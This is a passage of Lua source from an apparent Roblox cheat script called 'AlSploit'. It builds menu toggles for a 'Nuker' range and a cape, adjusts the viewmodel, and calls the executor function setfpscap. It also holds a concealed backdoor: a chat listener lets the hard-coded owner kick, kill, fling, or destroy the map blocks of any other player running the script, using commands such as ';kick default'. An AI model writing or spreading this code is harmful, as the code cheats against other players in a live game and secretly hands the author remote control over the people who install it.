		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(WorldTab, "Range", Settings.Nuker.Range, 30, LayoutOrder + 4, function(CallBack)
					Settings.Nuker.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
		Settings.Cape.Value = CallBack

		task.spawn(function()
			if Settings.Cape.Value == true then
				local DecalId = (Settings.Cape.Sigma and 13528140280 or 16331277884)

				CreateCape("rbxassetid://" .. DecalId)	
			end
		end)	

		task.spawn(function()
			LocalPlayer.CharacterAdded:Connect(function()
				if Settings.Cape.Value == true then
					local DecalId = (Settings.Cape.Sigma and 13528140280 or 16331277884)

					if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") then
						CreateCape("rbxassetid://" .. DecalId)
					end
				end						
			end)
		end)		

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) then
					if LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
						local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
						local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = (IsMoving() and -0.6 or -0.2)})

						CapeTween:Play()
					end			
				end		
			until Settings.Cape.Value == false			
		end)

		task.spawn(function()
			if Settings.Cape.Value == false then
				if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
					LocalPlayer.Character.Cape:Destroy()
				end			
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Cape.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Cape.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Cape.KeyBind then
					Settings.Cape.Value = not Settings.Cape.Value

					if Settings.Cape.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Cape.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(WorldTab, "Sigma", Settings.Cape.Sigma, LayoutOrder + 2, function(CallBack)
					Settings.Cape.Sigma = CallBack

					task.spawn(function()
						task.spawn(function()
							if Settings.Cape.Sigma == true then
								if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
									LocalPlayer.Character:FindFirstChild("Cape").Decal.Texture = "rbxassetid://" .. 13528140280
								end
							end
						end)

						task.spawn(function()
							if Settings.Cape.Sigma  == false then
								if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
									LocalPlayer.Character:FindFirstChild("Cape").Decal.Texture = "rbxassetid://" .. 16331277884
								end
							end
						end)						
					end)
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	repeat
		task.wait(1)

		task.spawn(function()
			for i, v in next, PlayerService:GetPlayers() do
				v.Chatted:Connect(function(Message)		
					task.spawn(function ()
						if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer:Kick("Kicked by AlSploit owner")
						end
					end)

					task.spawn(function()
						if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							KillHumanoid(0)
						end	
					end)

					task.spawn(function()
						if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
						end
					end)

					task.spawn(function()
						if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							for i, v in next, CollectionService:GetTagged("block") do
								v:Destroy()
							end
						end
					end)					
				end)
			end
		end)		
	until not game
end)

task.spawn(function()
	task.spawn(function()
		local Horizontal = {Value = 15}
		local Vertical = {Value = 5}
		local Depth = {Value = 35} 

		local RotationZ = {Value = 5}

		local ViewModel = Camera:FindFirstChild("Viewmodel")
		local C1 = ViewModel.RightHand.RightWrist.C1

		LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(Depth.Value / 10))
		LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (Horizontal.Value / 10))
		LocalPlayer.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_VERTICAL_OFFSET", (Vertical.Value / 10))

		ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))
	end)

	task.spawn(function()
		CreateNotification(5, "AlSploit has loaded!")
	end)

	task.spawn(function()
		setfpscap(999)
	end)
end)
